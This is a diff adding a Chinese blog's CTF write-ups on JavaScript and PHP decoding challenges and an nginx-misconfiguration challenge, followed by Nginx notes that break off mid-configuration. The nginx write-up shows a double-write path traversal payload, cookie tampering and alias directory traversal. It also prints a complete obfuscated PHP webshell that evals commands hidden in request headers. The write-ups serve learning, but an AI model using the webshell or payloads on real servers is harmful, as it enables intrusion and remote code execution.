class="keyword">var</span> r = [<span class="string">&quot;g&#123;&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;_0&quot;</span>];</span><br><span class="line">						<span class="keyword">var</span> i = [<span class="string">&quot;it&#x27;&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;n&quot;</span>];</span><br><span class="line">						<span class="keyword">var</span> s = [t, n, r, i];</span><br><span class="line">						<span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; o &lt; <span class="number">13</span>; ++o) &#123;</span><br><span class="line">							<span class="built_in">document</span>.write(s[o % <span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">							s[o % <span class="number">4</span>].splice(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>
+
+<p>满足条件后计算出flag，条件应该是需要拼接的，计算部分导入控制台出结果：</p>
+<p><img src="D:\HexoBlog\source\images\NaNNaNNaNNaN-Batman\image-20210318175207495.png" alt="image-20210318175207495"></p>
+<blockquote>
+<p>……</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/18/web2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/18/web2/" class="post-title-link" itemprop="url">web2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-18 16:22:55 / 修改时间：16:26:57" itemprop="dateCreated datePublished" datetime="2021-03-18T16:22:55+08:00">2021-03-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h5 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h5><h6 id="1-题目"><a href="#1-题目" class="headerlink" title="1.题目"></a>1.题目</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接交代了源码，看过上一个混淆，这个看着就顺眼多了</p>
+<p>根据代码，关键也就是截取字符使ASCII移位，最后rot13，base64……</p>
+<p>解密：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">	$_o=base64_decode(strrev(str_rot13($str)));</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)<span class="number">-1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">	$_=strrev($_);</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">return</span> $_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> decode($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/web2/image-20210318162648203.png" alt="image-20210318162648203"></p>
+<p>ok……</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/18/Web-php-wrong-nginx-config/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/18/Web-php-wrong-nginx-config/" class="post-title-link" itemprop="url">Web_php_wrong_nginx_config</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-18 14:57:33 / 修改时间：16:12:16" itemprop="dateCreated datePublished" datetime="2021-03-18T14:57:33+08:00">2021-03-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="Web-php-wrong-nginx-config"><a href="#Web-php-wrong-nginx-config" class="headerlink" title="Web_php_wrong_nginx_config"></a>Web_php_wrong_nginx_config</h4><p>进入题目是一个登录界面，拿御剑扫一下：</p>
+<img src="/images/Web-php-wrong-nginx-config/image-20210318150302083.png" alt="image-20210318150302083" style="zoom:80%;" />
+
+<p>出来很多，但只有admin管用……</p>
+<p>admin有一个please continue……手动发现robots.txt……愣是扫不出来</p>
+<p>：hints.php Hack.php</p>
+<p>hints告诉我们</p>
+<p><img src="/images/Web-php-wrong-nginx-config/image-20210318150619914.png" alt="image-20210318150619914"></p>
+<p>应该有一个文件读取的部分……</p>
+<p>抓包，cookie里有一个isLogin=0，改成1进入了网站页面：</p>
+<img src="/images/Web-php-wrong-nginx-config/image-20210318150825792.png" alt="image-20210318150825792" style="zoom:80%;" />
+
+<p>管理中心页面：<img src="/images/Web-php-wrong-nginx-config/image-20210318150858928.png" alt="image-20210318150858928" style="zoom:80%;" /></p>
+<p>这里应该可以读取配置文件……读不出来，原来是过滤了../  </p>
+<p>双写：</p>
+<p><code>?file=..././..././..././..././etc/nginx/sites-enabled/site.conf&amp;ext=</code></p>
+<p>读取：</p>
+<p><img src="/images/Web-php-wrong-nginx-config/image-20210318151131711.png" alt="image-20210318151131711"></p>
+<p>按照提示说的，应该是Nginx的配置文件，用<strong>nginx-config-formatter-master</strong>整理代码：</p>
+<blockquote>
+<p>python nginxfmt.py [filename.conf]</p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">8080</span>;</span><br><span class="line">    <span class="comment">## listen for ipv4;</span></span><br><span class="line">    <span class="attribute">this</span> line is default and implied listen [::]:<span class="number">8080</span>;</span><br><span class="line">    <span class="comment">## listen for ipv6 root /var/www/html;</span></span><br><span class="line">    <span class="attribute">index</span> index.php index.html index.htm;</span><br><span class="line">    <span class="attribute">port_in_redirect</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">server_name</span> _;</span><br><span class="line">    <span class="comment"># Make site accessible from http://localhost/ #server_name localhost;</span></span><br><span class="line">    <span class="comment"># If block for setting the time for the logfile if ($time_iso8601 ~ &quot;^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)&quot;) &#123; set $year $1;</span></span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$month</span> <span class="variable">$2</span>;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$day</span> <span class="variable">$3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html sendfile off;</span></span><br><span class="line"><span class="attribute">set</span> <span class="variable">$http_x_forwarded_for_filt</span> <span class="variable">$http_x_forwarded_for</span>;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$http_x_forwarded_for_filt</span> <span class="regexp">~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+)</span> &#123;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$http_x_forwarded_for_filt</span> <span class="variable">$1</span>???;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Add stdout logging access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;</span></span><br><span class="line"><span class="attribute">error_log</span> /var/log/nginx/error.log <span class="literal">info</span>;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="comment"># First attempt to serve request as file, then # as directory, then fall back to index.html try_files $uri $uri/ /index.php?q=$uri&amp;$args;</span></span><br><span class="line">    <span class="attribute">server_tokens</span> <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#error_page 404 /404.html;</span></span><br><span class="line"><span class="comment"># redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html;</span></span><br><span class="line"><span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">    <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php?q=<span class="variable">$uri</span>&amp;<span class="variable">$args</span>;</span><br><span class="line">    <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line">    <span class="attribute">fastcgi_pass</span> unix:/var/run/php/php5.6-fpm.sock;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_NAME <span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">    <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> REMOTE_ADDR <span class="variable">$http_x_forwarded_for</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ /\.</span> &#123;</span><br><span class="line">    <span class="attribute">log_not_found</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /web-img &#123;</span><br><span class="line">    <span class="attribute">alias</span> /images/;</span><br><span class="line">    <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~* \.(ini|docx|pcapng|doc)$</span> &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">include</span> /var/www/nginx[.]conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>location这里就是处理路由，location明确不同的节点该如何处理：</p>
+<blockquote>
+<p>deny all 即拒绝访问。也可以allow指定IP访问</p>
+<p><strong>root：</strong></p>
+<p>location /i/ {</p>
+<p>root /data/w3;      </p>
+<p> }</p>
+<p>root的处理结果是：root路径＋location路径</p>
+<p>请求 <code>http://xxxx/i/top.gif </code>这个地址时，那么在服务器里面对应的真正的资源是<code> /data/w3/i/top.gif</code>文件</p>
+<p><strong>alias：</strong></p>
+<p>location /i/ {</p>
+<p>alias /data/w3/;   </p>
+<p>}</p>
+<p>alias的处理结果是：使用alias路径替换location路径</p>
+<p>同样请求 <code>http://foofish.net/i/top.gif</code> 时，在服务器查找的资源路径是：<code> /data/w3/top.gif</code>，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。</p>
+</blockquote>
+<p>尽管绝大部分配置都看不懂，但知道有一个/web-img的路径，转到根目录的/images中去……</p>
+<p>而alias下的是： <strong>autoindex on;</strong></p>
+<blockquote>
+<p>Nginx默认是不允许列出整个目录的</p>
+<p>如需此功能，打开nginx.conf文件，在location server 或 http段中加入<strong>autoindex on</strong>；</p>
+<p>也就是访问这个网页可以实现网站目录遍历</p>
+</blockquote>
+<p>访问：<a target="_blank" rel="noopener" href="http://111.200.241.244:58533/web-img/">http://111.200.241.244:58533/web-img/</a></p>
+<img src="/images/Web-php-wrong-nginx-config/image-20210318153058090.png" alt="image-20210318153058090" style="zoom:80%;" />
+
+<p>该目录下没有什么文件，访问/web-img../相当于/images/../，可以读到上层的目录</p>
+<p><img src="/images/Web-php-wrong-nginx-config/image-20210318160059239.png" alt="image-20210318160059239"></p>
+<p>发现hack.php.bak下载读取：</p>
+<p><img src="/images/Web-php-wrong-nginx-config/image-20210318160147928.png" alt="image-20210318160147928"></p>
+<p>php混淆……离谱</p>
+<p>观察一下，关键是利用$f创建了一个函数，输出f并格式化：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$kh=<span class="string">&quot;42f7&quot;</span>;</span><br><span class="line">$kf=<span class="string">&quot;e9ac&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>) </span>&#123;</span><br><span class="line">	$c=strlen($k);</span><br><span class="line">	$l=strlen($t);</span><br><span class="line">	$o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;$l;) &#123;</span><br><span class="line">		<span class="keyword">for</span> ($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;</span><br><span class="line">			$o.=$t &#123;</span><br><span class="line">				$i</span><br><span class="line">			&#125;</span><br><span class="line">			^$k &#123;</span><br><span class="line">				$j</span><br><span class="line">			&#125;</span><br><span class="line">			;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra) &#123;</span><br><span class="line">	$u=parse_url($rr);</span><br><span class="line">	parse_str($u[<span class="string">&quot;query&quot;</span>],$q);</span><br><span class="line">	$q=array_values($q);</span><br><span class="line">	preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);</span><br><span class="line">	<span class="keyword">if</span>($q&amp;&amp;$m) &#123;</span><br><span class="line">		@session_start();</span><br><span class="line">		$s=&amp;$_SESSION;</span><br><span class="line">		$ss=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">		$sl=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">		$i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">		$h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">		$f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">		$p=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> ($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)$p.=$q[$m[<span class="number">2</span>][$z]];</span><br><span class="line">		<span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>) &#123;</span><br><span class="line">			$s[$i]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">			$p=$ss($p,<span class="number">3</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(array_key_exists($i,$s)) &#123;</span><br><span class="line">			$s[$i].=$p;</span><br><span class="line">			$e=strpos($s[$i],$f);</span><br><span class="line">			<span class="keyword">if</span>($e) &#123;</span><br><span class="line">				$k=$kh.$kf;</span><br><span class="line">				ob_start();</span><br><span class="line">				@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e))),$k)));</span><br><span class="line">				$o=ob_get_contents();</span><br><span class="line">				ob_end_clean();</span><br><span class="line">				$d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line">				<span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">				@session_destroy();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>离谱，php混淆的代码，后面有个eval，大概是一个马……</p>
+<p>我太菜了，看不动……</p>
+<p>dalao：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/107801811">https://blog.csdn.net/weixin_44604541/article/details/107801811</a></p>
+<p>dalao竟然写了可交互的脚本……离谱：</p>
+<p><img src="/images/Web-php-wrong-nginx-config/image-20210318160642217.png" alt="image-20210318160642217"></p>
+<p>tql</p>
+<blockquote>
+<p>……wohaocai</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/18/Nginx%E5%85%A5%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/18/Nginx%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">Nginx入门</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-18 12:09:04 / 修改时间：14:56:58" itemprop="dateCreated datePublished" datetime="2021-03-18T12:09:04+08:00">2021-03-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h5 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h5><p><strong>1.简介</strong>：高性能的HTTP和反向代理服务器，占有内存少，并发能力强。</p>
+<p>​    Nginx与Tomcat：Nginx可以作为静态页面的web服务器，支持CGI协议的动态语言，perl、php。    不支持Java，与apache构成竞争关系。Nginx更有优势。</p>
+<p>​    Nginx功能丰富，可作为HTTP服务器，也可作为反向代理服务器，邮件服务器。支持FastCGI、SSL、Virtual Host、URL Rewrite、Gzip等功能。并且支持很多第三方的模块扩展。</p>
+<p><strong>2.功能</strong>：</p>
+<ul>
+<li>​    正向代理：客户端通过代理服务器发送访问请求</li>
+<li>​    反向代理：客户端访问Nginx代理的服务器，访问不到后台服务器</li>
+<li>​    负载均衡：请求分发，根据路线，速度分配请求；提高抗风险能力。</li>
+<li>​    动静分离：拿出静态资源，减小动态资源数据包，快速上线、修改；页面样式修改方便。</li>
+</ul>
+<p><strong>Nginx配置：</strong></p>
+<blockquote>
+<ul>
+<li>1、<strong>全局块</strong>：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。</li>
+<li>2、<strong>events块</strong>：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。</li>
+<li>3、<strong>http块</strong>：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。</li>
+<li>4、<strong>server块</strong>：配置虚拟主机的相关参数，一个http中可以有多个server。</li>
+<li>5、<strong>location块</strong>：配置请求的路由，以及各种页面的处理情况。</li>
+</ul>
+</blockquote>
+<p><img src="/images/Nginx%E5%85%A5%E9%97%A8/image-20210318133439418.png" alt="image-20210318133439418"></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########### 每个指令必须有分号结束。#################</span></span><br><span class="line"><span class="comment">#user administrator administrators;  #配置用户或者组，默认为nobody nobody。</span></span><br><span class="line"><span class="comment">#worker_processes 2;  #允许生成的进程数，默认为1</span></span><br><span class="line"><span class="comment">#pid /nginx/pid/nginx.pid;   #指定nginx进程运行文件存放地址</span></span><br><span class="line"><span class="attribute">error_log</span> log/error.log <span class="literal">debug</span>;  <span class="comment">#制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emerg</span></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">accept_mutex</span> <span class="literal">on</span>;   <span class="comment">#设置网路连接序列化，防止惊群现象发生，默认为on</span></span><br><span class="line">    <span class="attribute">multi_accept</span> <span class="literal">on</span>;  <span class="comment">#设置一个进程是否同时接受多个网络连接，默认为off</span></span><br><span class="line">    <span class="comment">#use epoll;      #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport</span></span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;    <span class="comment">#最大连接数，默认为512</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;   <span class="comment">#文件扩展名与文件类型映射表</span></span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream; <span class="comment">#默认文件类型，默认为text/plain</span></span><br><span class="line">    <span class="comment">#access_log off; #取消服务日志    </span></span><br><span class="line">    <span class="attribute">log_format</span> myFormat <span class="string">&#x27;<span class="variable">$remote_addr</span>–<span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] <span class="variable">$request</span> <span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> <span class="variable">$http_referer</span> <span class="variable">$http_user_agent</span> <span class="variable">$http_x_forwarded_for</span>&#x27;</span>; <span class="comment">#自定义格式</span></span><br><span class="line">    <span class="attribute">access_log</span> log/access.log myFormat;  <span class="comment">#combined为日志格式的默认值</span></span><br><span class="line">    <span class="attribute">sendfile</span> <span class="literal">on</span>;   <span class="comment">#允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。</span></span><br><span class="line">    <span class="attribute">sendfile_max_chunk</span> <span 